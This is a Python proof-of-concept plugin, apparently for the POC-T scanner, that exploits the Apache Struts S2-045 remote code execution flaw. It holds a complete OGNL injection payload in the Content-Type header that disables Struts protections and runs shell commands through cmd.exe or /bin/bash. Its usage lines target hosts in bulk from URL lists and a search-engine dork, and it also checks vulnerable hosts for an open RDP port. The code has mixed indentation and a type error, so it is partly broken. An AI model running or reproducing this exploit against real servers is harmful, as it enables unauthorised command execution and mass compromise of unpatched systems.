import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from plugin.util import host2IP
from plugin.util import checkPortTcp
"""
Struts S2-045 RCE PoC

Usage:
  python POC-T.py -s struts2-s2045 -iF url.txt
  python POC-T.py -s struts2-s2045 -aG "inurl:index.action"

"""
def poc(url):
	register_openers()
	datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
	header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
	header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask || whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	try:
	    request = urllib2.Request(url,datagen,headers=header)
	    response = urllib2.urlopen(request,timeout=5)
	    body=response.readlines()[0:2]
	except:
		body=""
		
    ip = host2IP(url)
	port = checkPortTcp(ip,3389)
	if "nMask" in body:
		return url + "---" + body + "---" + "3389:" + str(port)
	else:
		return False